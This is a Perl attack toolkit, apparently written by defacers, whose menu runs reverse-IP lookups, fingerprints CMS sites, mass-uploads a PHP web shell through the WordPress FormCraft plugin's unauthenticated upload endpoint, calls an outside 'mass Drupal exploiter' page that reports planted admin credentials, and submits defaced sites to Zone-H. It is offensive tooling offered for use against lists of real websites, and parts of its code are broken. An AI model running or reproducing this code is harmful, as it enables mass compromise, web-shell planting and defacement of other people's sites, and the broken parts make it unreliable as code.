#!/usr/bin/perl

#Coded By Kadd3chy

use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5;
use MIME::Base64;
use LWP::Simple;
use IO::Socket;
use HTTP::Request::Common;
use Term::ANSIColor;

$logo="

db   dD  .d8b.  d8888b. d8888b. d8888b.  .o88b. db   db db    db  db   db d88888b db      d8888b. d88888b d8888b.   db    db d8888b.     .d88b.  
88 ,8P' d8' `8b 88  `8D 88  `8D VP  `8D d8P  Y8 88   88 `8b  d8'  88   88 88'     88      88  `8D 88'     88  `8D   88    88 VP  `8D    .8P  88. 
88,8P   88ooo88 88   88 88   88   oooY' 8P      88ooo88  `8bd8'   88ooo88 88ooooo 88      88oodD' 88ooooo 88oobY'   Y8    8P   oooY'    88  d'88 
88`8b   88~~~88 88   88 88   88   ~~~b. 8b      88~~~88    88     88~~~88 88~~~~~ 88      88~~~   88~~~~~ 88`8b     `8b  d8'   ~~~b.    88 d' 88 
88 `88. 88   88 88  .8D 88  .8D db   8D Y8b  d8 88   88    88     88   88 88.     88booo. 88      88.     88 `88.    `8bd8'  db   8D db `88  d8' 
YP   YD YP   YP Y8888D' Y8888D' Y8888P'  `Y88P' YP   YP    YP     YP   YP Y88888P Y88888P 88      Y88888P 88   YD      YP    Y8888P' VP  `Y88P' 
										   
\n";
print $logo;
print color("magenta"),"[1] Reverse IP\n";
print color("green"),"[2] Zone-H Mass Poster\n";
print color("cyan"),"[3] Formcraft Mass File Upload\n";
print color("red"),"[4] Website Checker By (Adam TNX)\n";
print color("yellow"),"[5] Mass Drupal Exploiter By (Adam TNX)\n";
print color("blue"),"[6] About Me\n";
print color("white"),"[+] Choose Number : ";
my $targett = <>;
chomp $targett;
if($targett eq '1')
{
system('cls');
system('title Reverse IP');
                    {
use HTTP::Request;
use LWP::UserAgent;
if($^O =~ /Win/){

   system("cls");
   system("color c");
   system("title Reverse Domain Recoded By Kadd3chy");

}else{

   system("clear");
}
print q{

                           *----------------------*
                           |  [+] Reverse IP [+]  |
                           |  Run Me Now          |
                           |  Result in yes.txt   |
                           *----------------------*
};
print "\n[-]Use Proxy ? (Y/N):";
my $chose = <>;
chomp($chose);

if(lc($chose) eq 'y') {
sleep (3);
print "\n\n [+]Put Proxy (ex: 127.0.0.1:80) :";
my $proxy = <>;
chomp($proxy);
print "\n\n[*]Put Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "yes.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$ua->proxy('http', 'http://'.$proxy.'');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>yes.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+]All website Reversed.\n";
}
if(lc($chose) eq 'n') {

print "\nPut Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "yes.txt";
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>yes.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+]All website Reversed.\n";
}}
}
if($targett eq '2')
{
use URI::URL;
use LWP::UserAgent;
use Term::ANSIColor;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


print "[START] Give Me Sites List :";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;
foreach $tofuck(@TARGETS){

chomp($tofuck);



$req = HTTP::Request->new(GET=>$tofuck);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|Kadd3chy|HACKED|Kadd3chy/){
open (TEXT, '>>Defaced.txt');
print TEXT "\n$tofuck   =>  Posted !!\n\n";
close (TEXT);
print colored ("Wait I'wll Post it Now",'white on_magenta'),"\n";
                                $dmn= $Kadd3chy;
                                $def="Kadd3chy";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
				'defacer'     => $def,
				'domain1'   => $dmn,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
                                ]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print "$dmn submit $1\n";
                                }
                                else
                                {
                                print colored ("[ERROR]CANT POST Gass",'white on_red'),"\n";
                                     }
}
}}
if($targett eq '3')
{
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use LWP::UserAgent;
use Win32::Console::ANSI;
use HTTP::Request;
use Win32::Console::ANSI;
#if u use linux system remove the last line  :p 
#hacked by Kadd3chy
$Kadd3chy ="
  _  __         _     _ ____       _           
 | |/ /        | |   | |___ \     | |          
 | ' / __ _  __| | __| | __) | ___| |__  _   _ 
 |  < / _` |/ _` |/ _` ||__ < / __| '_ \| | | |
 | . \ (_| | (_| | (_| |___) | (__| | | | |_| |
 |_|\_\__,_|\__,_|\__,_|____/ \___|_| |_|\__, |
                                          __/ |
                                         |___/ 
                      Kadd3chy_Shell_Uploader\n
	         WordPress Plugins FormCraft
";
print $Kadd3chy;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
open(tarrget,"<$ARGV[0]") or die "Open Ur Fucking Eyes :D\n";
while(<tarrget>){
chomp($_);
$site = $_;

riahi();




sub riahi(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    print color("green"), "[vuln]";
    print color('reset');
    print " $site\n";
    up();
}else{

 print "$site Nçt Vul :(\n";
}

}

sub up(){
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="cloud.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//cloud.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /Mister Spy/){
   print color('bold green');
print "Success ... :D\n";
print "--> $upzzspy\n";

    print color('reset');
print color('reset');
open(save, '>>Kadd3chy.txt');   
print save "$upzzspy\n";   
close(save);
}else{
print "...Failed :(\n";
}
}

}
sub zoneh(){

print colored ("",'Bold Green');

                                $hackname="Kadd3chy"; 
                                $zone="http://zone-h.org/notify/single";
                                $gh=LWP::UserAgent->new;
                                $res=$gh  -> post($zone,['defacer'     => $hackname,'domain1'   => $def,'hackmode' => '14','reason'       => '5','submit'       => 'Send',]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
                               	print color('reset');
                                print "[+] POSTING TO ZONE-H - ";
                                print color("red"), "ERROR\n";
								print color('reset');
                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
								print color('reset');
                             print "[+] POSTING TO ZONE-H - ";
                             print color("green"), "DONE\n";
								print color('reset');
								    open(save, '>>Zone-H.txt');   
                                    print save "$deface\n";   
                                    close(save);
                                }
}
}
if($targett eq '4')
{
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
my $tnx ="
            .                                    .               
         `  y`                                  /: ``            
         `` /d:                     --        `sd` .             
          ```:sd+.              -oooy:      /yd+.``              
         `` `` .ymh-           /syyydo   `ommo`````.             
         `-:``  `oym/         `yyyyNm   `ddy/   `.:`             
         ./:-.`` `.+-         +ys+hMm    y/`  ``.-::             
          .ss+-``` `         . -smdMs    -` .`./oy/              
           :+oo/:. ``       /- `o/yMo    ```.:/oo/.              
            -+os+:..-    `/hs: -/ydM:   .-`-/ooo/`               
               -:-.`-.`  ohh-y +- +M`  --.`---`                  
               :/o+:-.+/ `yd:/`/.-so :s/.-/o+/.                  
                 -.o`  -+:-h/hsd/--:+/`  //..                    
                         ./yo+-/+yo-                             
                            .`y- `                               
  Coded by Adam Tnx          `N:`                                
      fb/adam.ag.750          s.`                                
                               `                                 
    
 \n\n
";

    print color('bold red');

print $tnx;
print color("red"), "Tnx Website Checker -- Run me Now  \n";
print "List : \n";
$list=<STDIN>;

open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /http:\/\//) { $site = "http://$site/"; };
laweej();
}
system("PAUSE");

sub laweej($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);

my $tnx = $ua->get("$site")->content;
if($tnx =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
    print color('green');
    print "--WORDPRESS-- / $site \n";
    print color('reset');
open(save, '>>wordpress.txt');
    print save "$site\n";
	    close(save);
   

}

elsif($tnx =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>|Joomla!|Joomla|joomla/) {
    print color('green');
    print "--JOOMLA--  / $site \n";
    print color('reset');
open(save, '>>joomla.txt');
    print save "$site\n";
    close(save);

    }
elsif($tnx =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
    print color('green');
    print "--DRUPAL-- / $site \n";
    print color('reset');
open(save, '>>drupal.txt');
    print save "$site\n";
    close(save);
     

    }elsif($tnx =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
    print ;
    print "--Prestashop-- / $site \n";
    print color('reset');
open(save, '>>Prestashop.txt');
    print save "$site\n";
    close(save);
    

    
}
}}
if($targett eq '5')
{
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Response;
use Term::ANSIColor;
print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
my $tnx ="
            .                                    .               
         `  y`                                  /: ``            
         `` /d:                     --        `sd` .             
          ```:sd+.              -oooy:      /yd+.``              
         `` `` .ymh-           /syyydo   `ommo`````.             
         `-:``  `oym/         `yyyyNm   `ddy/   `.:`             
         ./:-.`` `.+-         +ys+hMm    y/`  ``.-::             
          .ss+-``` `         . -smdMs    -` .`./oy/              
           :+oo/:. ``       /- `o/yMo    ```.:/oo/.              
            -+os+:..-    `/hs: -/ydM:   .-`-/ooo/`               
               -:-.`-.`  ohh-y +- +M`  --.`---`                  
               :/o+:-.+/ `yd:/`/.-so :s/.-/o+/.                  
                 -.o`  -+:-h/hsd/--:+/`  //..                    
                         ./yo+-/+yo-                             
                            .`y- `                               
  Coded by Adam Tnx          `N:`                                
      fb/adam.ag.750          s.`                                
                               `                                 
    
 \n\n
";

    print color('bold blue');

print $tnx;
print color("red"), "W3lcome..New Mass Drupal exploiter  \n";
print color("green"), "If you need some website use the dorker \n";
print color("green"), " you will find it with this bot  \n";
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /www./) { $target = "www.$target"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });

my $exploit = "http://www.xgames.co.il/drupal_mass_exploiter.php";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success! Log in with username \"adamtnx\" and password \"admin\" at/) {
print color('bold white');
print "[";
print color('reset');
print color('bold green');
print "OK";
print color('reset');
print color('bold white');
print "] ";
print color ('green');
print "$target";
print color ('reset');
print " tneek :)  !! \n";


    open(save, '>>tnxVuln.txt');
  
    print save " Don3 ! $target | username : adamtnx | pass: admin\n";
  
    close(save);
}
else { 

#####################
###Error Mafaka#####
#####################
print color ('blue');
print "$target";
print color ('reset');
print " OOPS !! not vuln! \n";
}
}}
if($targett eq '6')
{
system('title About Me');
print color("red"),"Coder : Kadd3chy Tnx\n";
print color("blue"),"Mail : moat3z.kadd3chy[AT]gmail [com] | Facebook ID : Kadd3chy.py \n";
print color("white"), "Special Thanks To : Adam Tnx\n";
system("pause");
}
